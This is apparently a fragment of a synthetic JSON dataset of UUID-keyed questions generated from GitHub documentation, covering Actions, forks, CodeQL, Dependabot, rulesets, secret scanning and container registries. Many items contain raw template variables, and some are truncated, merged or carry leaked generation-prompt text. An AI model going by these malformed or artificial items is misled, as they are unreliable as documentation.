permissions for a forked repository in GitHub Actions", "cffa6a97-a698-4720-b2bd-71996c5ca0ac": "What are the available permissions for the `GITHUB_TOKEN` in GitHub Actions", "3adca9c0-7529-4b96-af9f-9154c1d4a514": "How can I ensure that the `GITHUB_TOKEN` has write permissions in a forked repository in GitHub Actions", "058eaaf5-adb2-492f-8ad8-13900310d790": "How can I define access for the `GITHUB_TOKEN` scopes in GitHub Actions", "b23ef060-cdf4-43b5-8baf-bcd7e9518d61": "How can I set the `GITHUB_TOKEN` permissions for a specific job in a workflow in GitHub Actions", "fe4b9994-c05d-4503-a322-b11733028fb2": "How can I set the `GITHUB_TOKEN`", "b61907e9-e18c-45bf-b8c8-dae3b90665a3": "How can I set the `GITHUB_TOKEN` permissions for all jobs in a workflow in GitHub Actions", "a2356080-4bbe-4814-9934-5c448aabbfb3": "What section should I refer to in order to select the runner for a job in GitHub Actions?", "e414f0ee-88e0-401d-9d93-be65e11248db": "How can I choose the runner for a job in GitHub Actions", "7e88def8-4a72-4c05-8fb5-096527825f21": "How can context information be utilized to define outputs for jobs in the context of GitHub Actions", "b3fff5ca-c860-4f80-b941-d6a720e48ea8": "Can you provide an example of how context information is used to define outputs for jobs in GitHub Actions?", "03f412e1-e8a0-438b-8605-030c2e72c545": "Can you provide an example of how to define the container image for running jobs in a container using GitHub Actions", "ba09958a-1014-4824-8317-fa008f61775a": "Can you provide an example of how to expose network ports on a container while running jobs in a container using GitHub Actions", "fc11d571-cfd7-4464-b72d-67afc20f095f": "How can I set container resource options while running jobs in a container using GitHub Actions", "4ed78a31-d8d8-440a-a257-675eb48af64f": "How can I define credentials for a container registry while running jobs in a container using GitHub Actions", "6e827226-ab64-4da7-beca-61efc85faf58": "How can I mount volumes in a container while running jobs in a container using GitHub Actions", "746074bd-7e84-4fbf-80f9-a4429dd128b9": "How can I expose network ports on a container while running jobs in a container using GitHub Actions", "928decfc-387b-4345-aab0-b321227e5bfe": "How can I define the container image for running jobs in a container using GitHub Actions", "f233f234-8f8f-4c69-be8d-9ad9364e6ae5": "How can I use environment variables with a container while running jobs in a container using GitHub Actions", "2e6528e5-0d08-417e-892a-3532fd8a5c1c": "How can default values be set for specific jobs in GitHub Actions, and what options can be configured for the `run` step", "30134e96-b161-436c-a334-f3d649f9c619": "What is the process for setting default shell and working directory values for jobs in GitHub Actions, and where can these settings be configured?", "32397954-d798-47c5-be3e-1d360dcf85ea": "How can a matrix strategy be used to automate the testing process for a software application? Provide an example of a single-dimension matrix configuration.2. How can contexts be used to create matrices in GitHub Actions? Provide an example of a matrix configuration created using contexts. Additionally, explain how to expand or add matrix configurations using include statements.", "77113ee4-3334-48ab-bb46-3c2e7216d61c": "How does {% data variables.product.prodname_actions %} handle concurrency by default, and what are the potential consequences of this behavior", "f4c84a1d-6944-483e-91a4-0bf0a28fa5d1": "How can {% data variables.product.prodname_actions %} be used to control concurrency, and what benefits does this provide in terms of resource management and avoiding conflicts? Provide specific examples of how concurrency can be controlled at the level of workflow runs, jobs, or steps.", "ed821bb1-e1f6-4a79-acd4-4a8f44c8f223": "How can conditions be used to control job execution in workflows? Provide an example.", "0b359aa7-5ff1-4a8a-a07d-5bfbd565d3c1": "What is the meaning of the statement \"This check was skipped.\" in the context of workflow jobs", "4d1a2b46-b1c1-42ae-a068-e63d13a03fd9": "What is the importance of including a license file when creating a public repository from a fork of someone's project? How can I ensure that I am following open source principles when using GitHub for my organization's development work?", "1e6853e3-4a80-4666-a2a4-2144889cc7a1": "What is a fork in the context of GitHub? How can it be used to propose changes to someone else's project", "c1b9504f-a5a7-4001-979f-52e40826a2c5": "How can I create a fork of a repository on GitHub using the web interface", "720df159-7cea-4af3-a58a-e693d92e7e2d": "How can I clone my forked repository to my local computer using the GitHub desktop app", "32f9a088-769a-46d4-9c1f-2abeed7ebc2b": "How can I configure Git to pull changes from the upstream repository into my local clone of the Spoon-Knife repository?", "e9495880-65b5-4282-bb10-cc5166a7b70b": "How can I navigate to my fork of the Spoon-Knife repository on {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom_the_website %}{% else %}{% data variables.location.product_location %}{% endif %}", "4bc2fa1c-a77d-46ef-a38c-9ca205cf1c00": "How can I go up one directory using the terminal", "6dbbe0a8-c5ff-4452-a335-26bebce6c29d": "How can I add a new remote repository to my fork using the terminal", "48f78a35-a508-4008-8c3a-aec0e5384468": "How can I view the current configured remote repository for my fork using the terminal", "6e52440e-4cd6-42b3-b3aa-dd1cc6b16bee": "How can I list the files and folders in my current directory using the terminal", "cd7174d1-df42-47d0-9050-b0356df436f5": "How can I verify the new remote repository I have specified for my fork using the terminal", "e1b6a335-b844-4b0b-9b0d-65dc4595ccf3": "How can I keep my fork synced with the upstream repository using the terminal", "0f3d02a5-d52b-4390-9645-9d29d34511be": "How can I change directories in the terminal to navigate to a specific location in my computer", "454b68b7-c1d1-41fa-a8ec-a025fc4bdbd8": "How can I go into a specific directory using the terminal", "6b686caa-1509-4213-99b4-d852449e3782": "How can I contribute to an open source project on GitHub by forking a repository", "faf0d176-c0ce-4793-9ad5-7f439931c10c": "What are the steps involved in editing a fork on GitHub, including creating branches and opening pull requests?", "46064a6a-1b26-46b4-b797-ddc9b4f6caaa": "What is the default behavior of {% data variables.large_files.product_name_short %} objects in archives of a repository on {% data variables.product.product_name %}", "1f3438ce-e7fe-4273-b6bc-288b6ff06910": "How can I improve the usability of archives for my repository on {% data variables.product.product_name %} by including {% data variables.large_files.product_name_short %} objects instead of just pointer files? What are the consequences of this decision in terms of bandwidth usage and external LFS servers?", "eaac58bf-aae2-4cfd-8eb0-32bcb86665f1": "What is the purpose of the `dependencies` value in the `qlpack.yml` file for a test pack in {% data variables.product.prodname_codeql %}, and how is it used to specify the packs containing queries to test?", "f42c5be4-928e-4418-9345-9283c2f41e81": "How does {% data variables.product.prodname_codeql %} provide automated regression testing for custom queries, and what is required to set up a test pack for these queries", "6e9eca78-d5bd-40f9-8734-9f17decd8386": "How can I create a sub-directory in a test {% data variables.product.prodname_codeql %} pack for a query, and what files should I add to it before running the test command", "b7b1c9d0-3b4b-41b8-afd3-acb2cb5a3d47": "What is the purpose of adding a query reference file (`.qlref`) to a sub-directory in a test {% data variables.product.prodname_codeql %} pack, and how should I define the location of the query in this file?", "2c572f31-3b20-473d-8797-b721c5737221": "Generate according to: {% data variables.product.prodname_codeql %} query tests are executed by running the following command:```shellcodeql test run ```The `--threads:` option can be used to specify the number of threads to use when running queries. The default option is `1`.For full details of all the options you can use when testing queries, see \"AUTOTITLE.\"Running `codeql test run`{% note %}**Note:** Your `.ql`, `.qlref`, and `", "f8cf24b9-787c-4da8-aa45-c2fe9b5e127b": "What are the options available when testing queries in {% data variables.product.prodname_codeql %} using the `codeql test run` command", "11f70b56-619f-40bc-afbc-bd38331a1996": "How can we test a query in {% data variables.product.prodname_codeql %} using the `codeql test run` command", "2117c02c-2969-45fb-8ec9-876e41fa2c60": "How do you prepare a query and test files for {% data variables.product.prodname_codeql %} in the context provided", "bcc20916-a6e7-4343-ba92-6be06a074081": "What is the difference between a {% data variables.product.prodname_codeql %} pack for custom queries and a {% data variables.product.prodname_codeql %} pack for custom tests in the context provided", "2d6dccd7-d750-4412-bea3-a14278952db1": "What is the role of the `qlpack.yml` file in the context provided", "48589e63-a89a-4d8e-9ba4-57110570549a": "What is the purpose of creating a {% data variables.product.prodname_codeql %} pack for custom queries and tests in the context provided", "4bea301f-153a-4c08-8347-fbb10ef542d1": "How do you add a {% data variables.product.prodname_codeql %} pack as a dependency in another {% data variables.product.prodname_codeql %} pack in the context provided", "87c66166-3ef9-475d-8d82-d09a5e716850": "How should the query specified in the context information be written in {% data variables.product.prodname_codeql %}", "559d1e09-fac8-4802-af30-37c61d272323": "What is the purpose of the `EmptyThen.expected` file in the context information, and how is it used in the test execution process?", "6f7a095e-ce2c-4e1e-a3d3-cb565fdd5549": "What information does the CLI output provide for failed test results, and how can it be used to debug more complex test failures?", "8623d1f4-cd8e-40ec-8de8-6eaa4a9d464b": "How does {% data variables.product.prodname_codeql %} generate test databases for debugging failing tests, and what is the default behavior for these databases after successful tests", "1a8447a6-192c-4708-bb41-12c05dd01e3a": "Can you provide an example of a query that falls under the category of l queries in Visual Studio Code, as mentioned in the context?", "f8eda983-974d-4d65-bb4d-e8fdf7719f5b": "How many l queries are required to be executed in Visual Studio Code as per the given context", "7efb7646-91c4-4ac8-bbf6-e43b0f6c3196": "What is GitHub's policy regarding account name squatting, and what actions may be taken against accounts violating this policy?", "86a589bd-a95a-41d1-be5d-2c432ed88d12": "What should I consider if the desired username on GitHub is already taken, according to the provided context information", "78aad96c-0fa8-4155-9d81-471b6fd12c93": "What is an enterprise account and how does it differ from a single organization setup? Provide examples of the roles that owners and billing managers can have in an enterprise account.2. How can payments be made for an enterprise account and what forms of payment are accepted? Are there any discounts offered for procurement companies or for renewal orders? Explain the benefits of setting up yearly billing for enterprise accounts.", "25feef5e-92f5-47d5-8f2f-b19f9edbe64e": "What are the different phases involved in building an image classifier using PyTorch in a Jupyter notebook, and how are they executed in sequence using the cells in the provided notebook?", "b3d44b16-6d2d-423e-a9b4-b56f6e077567": "How does the preinstalled set of machine learning libraries in the default container image used by {% data variables.product.prodname_github_codespaces %} benefit the user while building an image classifier using PyTorch in a Jupyter notebook", "1383beeb-ceee-4044-a415-6f5062ae9649": "Based on the context information provided, generate the following quiz/examination questions:1. How can I set up NVIDIA CUDA for my codespace in JupyterLab, and what is necessary for software that requires a GPU", "d6c7b982-573b-48e6-b344-6f3dbe30a24f": "What should I do if I am prompted to choose a kernel source in JupyterLab, and which version of Python should I select", "caf40f36-b6f2-4f5b-9e13-9fd5bbebbca0": "How can I configure NVIDIA CUDA for my codespace in JupyterLab, and what is required for software that uses a GPU", "cc01be4f-5591-4c94-9be4-e5994aeacb30": "What should I do if I am prompted to select a kernel source in JupyterLab, and which version of Python should I choose?", "cd97dd32-a3f1-41bf-8594-047e263522ba": "How does adding the \"ghcr.io/devcontainers/features/nvidia-cuda:1\" feature to the \"devcontainer.json\" file in the context provided result in the installation of CUDA in new codespaces created from this repository?", "66d75656-baac-4e25-896b-56d49374535a": "What is the purpose of adding the \"features\" section to the \"devcontainer.json\" file in the context provided", "14991967-0fc1-41d6-92aa-de0a750ba76d": "In the Docker ecosystem, how can {% data variables.product.prodname_dependabot %} be configured to only access private registries using the configuration methods provided? Which configuration method should be used if the private registry URL is not included in the `Gemfile` file?", "350995da-79d6-43ce-a44b-9ae04c28ac86": "How can {% data variables.product.prodname_dependabot %} be configured to only access private registries in the Bundler ecosystem, and what additional file is required for this configuration", "d1e2427b-b01f-4b1a-b688-d10ab81434fe": "What is the difference between setting `replaces-base` as `true` in a `dependabot.yml` file for Gradle, Maven, and Node projects, and when should I use this option", "6ff84cd5-1626-4af0-ba37-e4e6fa1893e2": "How can I define a private registry configuration in a `dependabot.yml` file for Gradle, Maven, and Node projects, and what should I be aware of when doing so", "cdc1d5e8-9fe1-4864-b8fb-da3e3c57c4ad": "When working with Node and npm, how can I ensure that my project only accesses private registries, and what steps are involved", "c99c00d1-dc6f-4de7-a5c0-42ae73001fc1": "How can I configure the Gradle ecosystem to only access private registries, and what configuration methods are available", "53d6a1f2-65b6-4a63-abcc-28a3ea3e571b": "In the context of the Maven ecosystem, how can I configure my project to only access private registries, and what are my options", "02183e69-ea76-4cd7-b611-96e792001793": "How can I specify a private registry URL", "19c36fb0-90aa-4aad-bc44-81080abd232b": "How can I configure the Yarn Classic ecosystem to only access private registries, and what are the different configuration methods available", "9f55112d-d116-4fe2-afc9-2975d080d24d": "What is the difference in configuration required for Yarn Classic and Yarn Berry private registries when using {% data variables.product.prodname_dependabot %}?", "ad891a2d-e197-4de2-b64f-ca5ec7137857": "What is the difference in configuration required for Yarn Classic and Yarn Berry private registries when using {% data variables.product.prodname_dependabot %}", "cb2bedc3-4ecc-46a7-8c2b-eff6fefa62f3": "Based on the context provided, generate the following questions:1. How can I ensure that {% data variables.product.prodname_dependabot %} only accesses private registries when working with the Yarn Classic ecosystem, and what are the different configuration methods available", "00b5342e-5508-4a74-a767-81e555db702a": "How can I configure Yarn Berry to only access private registries, and what are the different configuration methods available? Provide specific instructions and examples for each method.2. What is the difference between defining the private registry configuration in a `dependabot.yml` file and adding it to a `.yarnrc.yml` file in the project root? Which method should I use if I want to ensure the private registry is listed as the dependency source in the project's `yarn.lock` file? Provide step-by-step instructions for implementing this method.", "e9e17cbd-da34-43de-9711-bcbb2781c41b": " What configuration methods are available for the Pip ecosystem to only access private registries, and how can the private registry URL be added to the `pip.conf` file?", "973e4a3d-2c40-47ee-af57-d573f0954890": " How can private registries be configured for individual scopes in the Yarn ecosystem, and what is the format for defining them in the `.yarnrc` file", "39b6e189-653e-48e9-9993-38ce3324ecbb": "How can I configure Pip-compile to only access private registries", "d87cbf57-44d2-4227-bea9-efb7ba715f1f": "How can I define the private registry configuration in a dependabot.yml file for Pipenv", "ab22b668-b51b-415a-8f73-406ab3e6ad66": "What is a ruleset in the context provided? How does it differ from branch protection rules and tag protection rules", "f166ea19-a9f7-4feb-8ba8-e04668e0c7dd": "How can rulesets be used to control interactions with specific branches and tags in a repository? Provide an example of a ruleset that could be created for a repository's feature branch.", "96a470e4-3d12-4530-abf2-7ee6216cb450": "What additional rules can be created for controlling commit metadata in a repository using rulesets", "1e4123bc-5258-4499-8831-55e20b85903b": "What are the advantages of using rulesets over branch and tag protection rules in GitHub", "ebab7334-68ae-40b3-953f-c5e9f680abdd": "How can a ruleset be tested before making it active, and what insights page is available for viewing user actions affected by rules", "d565fb96-19fa-45c2-a22b-90994d4a4426": "How can rulesets be viewed in a", "baaa5760-df1f-4ec2-8078-49e61e0a7fb4": "How can rulesets be managed in a repository, and what is the status of an active ruleset", "d9b5dcf1-77f1-471a-b568-4f0404ee36ce": "How can someone understand why they have hit a rule in a repository, or how can an auditor check the security constraints for the repository without requiring admin access to the repository", "15e44e55-6cbf-4012-874e-2984de6b5e03": "How does layering of rulesets work in GitHub, and what happens when multiple rulesets target the same branch or tag in a repository", "6a42752c-c33c-480f-849e-ed14ac50efc5": "How can rulesets be set up at the organization level to target multiple repositories in an enterprise plan", "f36fd473-c5b1-48ac-bb0a-dac1cf265567": "How do rulesets and branch protection rules interact with each other in GitHub's repository protection feature? Provide an example to illustrate this interaction.2. In the context of GitHub's repository protection feature, what happens when multiple versions of the same rule exist across different sources? How is the most restrictive version determined?", "04f6e4f8-a677-4641-8fbe-f80f40d43211": "How can I import the Git & {% data variables.product.product_name %} starter assignment into my organization using {% data variables.product.prodname_classroom %}", "7c5ad55c-ce65-43b2-8975-4a1bcc59e471": "How do I name an individual assignment in {% data variables.product.prodname_classroom %} and what is the default repository prefix?", "73a415ef-fe88-46a8-95bc-477afa869a4d": "How can I create an assignment using {% data variables.product.prodname_classroom %} and what are the steps involved in doing so", "78026b1a-a919-4579-8443-bc825864fa68": "What are the options available for repository visibility while creating an assignment using {% data variables.product.prodname_classroom %}? How can I choose the appropriate visibility for my assignment repositories?", "ee3dccb8-c051-421c-bb7a-6d0b55f58ae2": "How can sensitive data be removed from the history of a Git repository using either the `git filter-repo` tool or the BFG Repo-Cleaner open source tool? Provide step-by-step instructions for removing a specific file with sensitive data and leaving the latest commit untouched using the BFG Repo-Cleaner.2. How can sensitive data be removed from the history of a Git repository using either the `git filter-repo` tool or the BFG Repo-Cleaner open source tool? Provide step-by-step instructions for replacing all occurrences of a specific text string in a repository's history using `git filter-repo`.", "f7cc7e29-74b7-4088-894b-17df75e5c724": "How can you remove sensitive data from the history of a Git repository using the `git filter-repo` tool? Provide step-by-step instructions, including any necessary command-line arguments and potential side effects.2. What is the purpose of running `git filter-repo --invert-paths --path PATH-TO-YOUR-FILE-WITH-SENSITIVE-DATA` in a Git repository, and what potential side effects should be considered? Explain the role of the `--invert-paths` and `--path` arguments, as well as any potential impact on tags and configuration files.", "ff170a48-eda1-484e-9f18-eafeabd3059a": "How do you ensure that sensitive data is not accidentally committed to a Git repository? Provide specific steps and tools that can be used to achieve this.2. What command should be used to restore remote URLs after using the `git filter-repo` tool to remove sensitive data from a Git repository's history? Provide the command syntax and any necessary context for understanding its usage.", "ec591ec2-e465-4646-ad46-be78dd2d0119": "How can you remove sensitive data from your Git repository using the BFG tool or `git filter-repo`? Provide step-by-step instructions on how to use these tools to remove the data and push the changes to GitHub. Be sure to include any necessary commands and options.2. After using the BFG tool or `git filter-repo` to remove sensitive data from your Git repository, what additional steps are necessary to fully remove the data from GitHub? Provide specific instructions on how to contact GitHub support and what information they will need in order to remove cached views and references to the sensitive data in pull requests. Additionally, explain why GitHub support won't remove non-sensitive data and when they will assist in the removal of sensitive data.", "fc64ccd6-fa22-448c-84e6-76843ab3346a": "How can you prevent accidental commits in Git while working on a project? Provide specific techniques or commands that can be used to achieve this.2. What is the purpose of running the following commands in Git to dereference and garbage collect objects:   ```shell   $ git for-each-ref --format=\"delete %(refname)\" refs/original | git update-ref --stdin   $ git reflog expire --expire=now --all   $ git gc --prune=now   ```   Explain the steps involved in each command and how they contribute to dereferencing and garbage collecting objects in Git.", "5eae9ba7-1d88-424e-8580-84c9a538a9de": "How can I access and manage environment secrets in the context of deployment environments, as explained in the provided text?", "f2701445-fc47-45ef-bc55-d55c98d9a67c": "What is the purpose of managing environment secrets in the context of deployment environments, as described in the given text material", "f8bf70bd-97cf-4bd2-9a28-bcf120d90d43": "What is the purpose of creating starter workflows in a GitHub organization's `.github` repository", "16fbe542-1184-4458-8f46-14cfe894fb55": "How can users access and use starter workflows created by other organization members", "62eddbf3-53be-42a9-9f4b-bf3d84a68e2b": "Given the context information and not prior knowledge.generate only answers based on the below query.You are a Student. Your task is to answer EXACTLY 2 questions based on the context information provided. The answers should be diverse in nature across the document. Restrict the answers to the context. Answers should be clear and concise.Don't ask for examples and keep the answers focused on once aspect at a time.answers:1. The purpose of creating starter workflows in a GitHub organization's `.github` repository is to provide a set of predefined workflows that organization members can use as a starting point for their", "dd8287e5-82f3-491c-aebb-0529e9313317": "How does the `filePatterns` property in the metadata file affect the workflow's behavior, and what types of files does it match?", "4d6da4fa-afee-4d44-bf03-575e3c0f8d8c": "What is the name of the workflow template described in the context information, and what is its purpose", "caaa0e74-9af1-44b5-a0a1-d0f2c85a7c7a": "How can I add a new starter workflow to the repository's workflow-templates directory?", "681281c9-1a71-467a-b63a-20c870cca340": "What is the purpose of the `filePatterns` field in a starter workflow", "fb62b405-dbae-46de-ae03-1113a0f7939b": "How can I determine the machine type that best fits the needs of my organization when launching {% data variables.product.prodname_ghe_server %} on Google Cloud Platform", "ecb3d403-7c8a-4ad2-b0d2-285b6c995968": "How can I select the {% data variables.product.prodname_ghe_server %} image when launching it on Google Cloud Platform", "1e246e6a-48a6-4855-8a37-c16beb9abc86": "What hardware considerations should be taken into account before launching {% data variables.product.prodname_ghe_server %} on Google Cloud Platform", "75274ff1-54ba-4657-af79-e3257860e141": "How can I configure the firewall for the network associated", "c65b68a7-1840-4fe3-ab0e-a3e81714ff28": "What is the recommended machine type for {% data variables.product.prodname_ghe_server %} when launching it on Google Cloud Platform", "0602d828-31aa-43b7-be37-a7e9c45145a3": "What are the prerequisites required to launch {% data variables.product.prodname_ghe_server %} on Google Cloud Platform", "2a8814c9-9c6e-43a6-b080-b7897439eb77": "Based on the context information provided, what is the recommended approach for opening network ports in Google Cloud Platform", "34b8b3d5-0bc0-4a70-bd63-a84fe9043d46": "What is the importance of reserving a static external IP address for a production appliance in Google Cloud Platform, and how can it be achieved?", "f54631e8-8797-4885-a265-1e1f4d618f66": "How can I create a data disk for my {% data variables.product.prodname_ghe_server %} instance on Google Cloud Platform? Provide the necessary steps and required parameters.2. After creating the data disk, how can I attach it to my {% data variables.product.prodname_ghe_server %} instance and configure it based on my user license count? Please provide detailed instructions.", "388e0dfc-2438-4b74-acfa-fe5c572f4752": "What HTTP response is returned when attempting to block users without the required scope?", "41a45868-adc8-44e0-a278-d4c4d4215178": "What is the specific scope required to block users in the context provided", "5bca4f79-19fd-466e-bbcb-75fb3e0f1cf1": "What versions of {% data variables.product.prodname_copilot_for_business %} are currently supported by the REST API for managing subscriptions? (fpt and ghec)", "764c4f97-ed15-4829-af31-25944ffc2e2d": "How can I manage the subscription for {% data variables.product.prodname_copilot_for_business %} using the REST API for my organization", "be7aeec3-869c-49b4-950d-5d0c13ccea2e": "How can I sponsor a maintainer through Patreon on GitHub", "2a8596c6-063c-4b87-8ca1-e288adb68257": "What are the steps involved in linking my Patreon account to my GitHub account?", "843c6e6e-7615-42aa-bf0a-d305649a81e2": "What resources and tools can we leverage to efficiently enable {% data variables.product.prodname_code_scanning %} across a large number of repositories, and how can we ensure the rollout is successful", "de2cfb44-ecb8-4bac-806d-c12696ee3e4e": "How can we prepare our teams to use {% data variables.product.prodname_code_scanning %} effectively, and what role should remediation play during the rollout process", "89830f90-d79b-473f-80ba-3bb948e04d66": "How can you gather information about the programming languages used in your organization's repositories using GitHub's GraphQL API? Provide a step-by-step guide with specific queries and instructions on how to interpret the results.2. How can you enable GitHub's Code Scanning feature for all repositories that use a specific programming language, such as JavaScript or Python, using GitHub's GraphQL API? Provide a detailed explanation of the necessary steps and any required configurations.", "0d307b12-0836-4242-a289-6de32053a6ca": "How can you identify candidate repositories for pilot programs in phase 3 of implementing {% data variables.product.prodname_code_scanning %} across your enterprise, based on the context information provided", "aadbfa84-9c8d-46cb-ac4a-00a5980bd0e5": "What steps should you take to prepare for enabling {% data variables.product.prodname_secret_scanning %} in your organization, as outlined in the context information?", "ca6226e3-4f56-40d9-b585-10573e3dd678": "What is {% data variables.secret-scanning.partner_alerts %} and how does it differ from {% data variables.product.prodname_dotcom %} alerts for secrets in public repositories?", "f6f88d5b-98df-4694-9b88-d7abd4f073bc": "What is {% data variables.product.prodname_GH_advanced_security %} and how does it alert users about security issues in their repositories", "c215c3f5-e549-4660-8f4d-7cf9b5172d5d": "How can custom patterns be configured for {% data variables.product.prodname_secret_scanning %} and what types of secret formats can be detected using this feature? (Assuming custom patterns for {% data variables.product.prodname_secret_scanning %} is available)", "4917cc90-a549-4687-827c-67391806862d": "What are the downstream effects of enabling {% data variables.product.prodname_secret_scanning %} for all repositories at the organization level", "e8b52b17-ced3-4d28-aa4d-7467b9ae745e": "What types of secrets are currently supported by {% data variables.product.prodname_secret_scanning %} for partner patterns?", "fa373984-86bc-4914-bea7-fcb268dd7e00": "What is the purpose of building a list of secret types while auditing repositories for {% data variables.product.prodname_secret_scanning %}", "b424e5ef-d565-417e-a3ce-da613ca53eb9": "How can an organization owner delete a team from the team's settings page", "49018b6b-19d5-4ada-b021-878acf586692": "Who is authorized to delete parent teams in an organization?", "59099c61-054c-44a8-9865-a1bc1304f612": "What is the Educational Use Agreement and how does it allow educational institutions to use GitHub Products for academic purposes", "d1534a1d-bd9c-4a8c-96ec-13a6b29197d4": "What is the role of the Designated Admin in this agreement and how many Designated Admins can an educational institution have?", "62bd3550-51d9-432c-8011-42b4385a8085": "What is the role of the GitHub Program Manager in the context provided? How can a Partner provide Partner Materials to help GitHub market and promote the Program to Qualified Users as part of the Campaign?", "4c88da29-1dee-4c2c-b6d8-db633a5489b2": "What is the difference between GitHub Enterprise Cloud and GitHub Enterprise Server? How can they be sold separately by GitHub", "b04762b4-0996-455d-b353-b9da7181d75e": "What are the benefits that a Qualified User can receive under the GitHub Campus Program, and how can they access these benefits", "cd753875-f91a-4fd4-9a43-85ffe0b1260b": "What conditions must a Qualified User adhere to in order to continue receiving benefits under the GitHub Campus Program?", "2ba9ead5-21b0-4a38-aa5e-96963f922352": "What is the role and responsibility of the Designated Admin in the GitHub Program, and why is it important to provide their contact information to the GitHub Program Manager", "60260c70-26d8-449f-99b8-f53a47362c65": "What is meant by \"Qualified User Communications\" in the context of the GitHub Program, and why is it necessary to provide channels of communication for GitHub to communicate with these users? Additionally, what measures are in place to ensure that these users have the ability to opt-out of future communications?", "13b6a9b7-22fa-43ab-91a5-edb2b933ab94": "Based on the information provided, what is the definition of \"Good Standing\" in the context of this agreement", "57e77d10-c011-42a3-bd8d-317f1c06f065": "What are the restrictions and limitations placed on the use of the GitHub Products by the recipient of this agreement, as outlined in section 3.1?", "9c64a671-5d10-438a-9d61-754f5bcdb80e": "What representations and warranties does Education Partner make regarding the Partner Materials, and what indemnification obligations does Education Partner have in connection with these materials?", "508235a9-b8fc-48fe-aded-15b0b3b1c76f": "What licenses does Education Partner grant to GitHub during the Agreement Term, and what conditions are attached to these licenses", "fbadf516-dd08-4d56-84c6-7f862866da9a": "What actions are required from the customer upon termination or expiration of the agreement, and what sections of the agreement will survive such termination or expiration?", "210b0f9f-0a28-496f-96e6-d362dba4d53f": "Based on the information provided, what is the duration of the initial term of the agreement between the parties", "d4af783b-0c47-46e1-a6fc-cd2e642f1ba0": "What types of damages are explicitly excluded from liability in this agreement, and what is the maximum amount of liability for either party under any circumstances?", "847ca6d2-7e9b-4a63-bc14-a1cacbf0e984": "Based on the information provided, can you summarize the terms of the agreement between the two parties regarding the pricing and provision of GitHub Products", "23881446-e206-4c08-ad4d-9e33bf556899": "What legal framework governs the use of GitHub Products, and what type of disputes related to these products are subject to arbitration in San Francisco, California?", "052c020f-a3ac-4caf-a3d6-37ab74954cbb": "How does GitHub handle changes to its terms and conditions, and what notice is provided to users in such cases", "c4693422-bf40-4511-a638-1481fb779503": "How does the GitHub Products agreement supersede any prior agreements or communications between the user and GitHub, and what terms and statements does it govern", "a286021d-029b-41d5-b9b7-9e5e3b352046": "What are the applicable GitHub Products terms and how do they differ from the Privacy Statement? How do these terms and statements govern the user's use of the GitHub Products?", "cc4fb91c-5621-432b-9be5-f7eaa6b0516a": "What are the different ways in which an organization owner or member with admin permissions can configure {% data variables.product.prodname_copilot %} access for their organization, and how do these configurations differ based on the enterprise policy settings?", "cfb4baba-8feb-4649-815a-03981297f227": "How can an enterprise owner enable {% data variables.product.prodname_copilot_business_short %} for their organization, and what policy configuration options are available to them", "405dec29-53d7-4b44-b869-fb6a41bb21cb": "What steps are required to assign {% data variables.product.prodname_copilot %} seats to individuals and teams within an organization", "0b5f7c13-486a-4f36-8d43-8e004998cbe5": "How can an organization owner determine whether to allow or block suggestions from {% data variables.product.prodname_copilot %} that match public code", "c5769cbc-a997-4efa-8739-b7221c6437d8": "Based on the context information provided, can you summarize the main topic discussed in the document", "67f04da2-de9e-4c59-91f3-9b1eb3866b3d": "How does the information presented in the document relate to the concept of \"context information\"? Provide specific examples to support your answer.", "dc4101f3-4a38-4399-af32-d21e0576b6ba": "What are the different ways an organization owner can control access to their organization using {% data variables.product.prodname_github_apps %}, {% data variables.product.prodname_oauth_apps %}, and {% data variables.product.pat_generic %}s? Provide examples of each method.", "76ed7dad-863a-4deb-82a3-55bf586282de": "What is programmatic access and how can it be used to manage resources owned by an organization on GitHub", "aa2a4751-c38e-487b-aa68-108b7d99b3cd": "How can organization owners manage {% data variables.product.pat_generic %}s in their organization, and what restrictions can they impose?", "ef8a50de-5a79-44a2-8ae7-9361166ae9f2": "What is the difference between a {% data variables.product.prodname_github_app %} and a {% data variables.product.prodname_oauth_app %} in the context of an organization", "20742092-b0de-4002-814a-de481cf91f47": "How can labels be used to route workflow jobs to specific types of self-hosted runners based on their shared characteristics? Provide an example of a characteristic that could be used to assign a label to a runner.2. What is the purpose of runner groups for self-hosted runners defined at the organization or enterprise level, and how can they be configured for a job? Provide an example of a characteristic that could be used to create a runner group.", "c7f912a5-0bab-412c-94d4-960714330106": "What are the default labels applied to self-hosted runners, and how can they be combined with custom labels to route jobs more specifically? Can you provide an example of how to use both default and custom labels in a job's `runs-on` field?", "8894c572-408b-4a63-89c3-dc51cc51da8f": "How can custom labels be used to route jobs on self-hosted runners, and what type of hardware or software requirements can be specified using these labels", "c198ad07-f3d6-4428-84f3-ce288c743007": "What is the maximum amount of time a job can remain queued before it fails, and what happens during this time?", "3750f5c1-ccfd-4570-96d3-cddb14a12409": "How does {% data variables.product.prodname_dotcom %} determine which self-hosted runner to assign a job to, and what happens if a suitable runner is not found", "82336888-bab1-47c0-96ac-19a6892d8717": "What container image formats are currently supported by the {% data variables.product.prodname_container_registry %}, and how does it handle foreign layers in Docker images", "64b7d2ae-98f3-41d2-ab89-eb0e526a7e55": "How can I authenticate to the {% data variables.product.prodname_container_registry %} using a personal access token (PAT)", "cfe10750-7616-4bdb-92cf-2795d33dbdd6": "How does the {% data variables.product.prodname_container_registry %} benefit container image management", "3775e7bf-814d-4b00-8b60-7a5155624757": "How can I authenticate to", "c4c9ab97-6ff0-4b5a-b146-c54a4034882c": "How can I push a container image to the {% data variables.product.prodname_container_registry %} using the command `docker push`", "5f64ae0e-0c7b-4c1a-9372-70f446cf29f2": "What is the difference between Docker Image Manifest V2, Schema 2 and Open Container Initiative (OCI) Specifications, and which ones are supported by the {% data variables.product.prodname_container_registry %}", "fa1be0e8-185e-4ea7-ad31-6f988f8b7221": "What is the recommended way to connect a repository to a container package when publishing an image from the command line, and why is it important to add the label `org.opencontainers.image.source` to your `Dockerfile` in this scenario?", "d0155cb9-1da2-49ad-9a0b-ff3cc2138198": "How can you ensure that you're always using the same container image version when pulling an image, and what command can you use to find the exact SHA value for the digest", "959c1d86-db2a-4d29-a05e-77acd52cf397": "How can I remove a specific container image from my local Docker registry using the Docker CLI? Provide the necessary command syntax and replace the placeholders with the appropriate values.2. How can I pull a specific container image from the Docker Hub registry using the Docker CLI, including the image name, version tag, and personal account or organization scope? Provide the necessary command syntax and replace the placeholders with the appropriate values.", "94df522a-5d10-4a63-ad93-9117e750d6ce": "What annotation keys are supported in the {% data variables.product.prodname_container_registry %} and what information do they provide on the package page?", "845f212e-f645-46b9-a0c2-6b3fff8f9e15": "How can I tag a Docker image using its ID and a desired image name and hosting 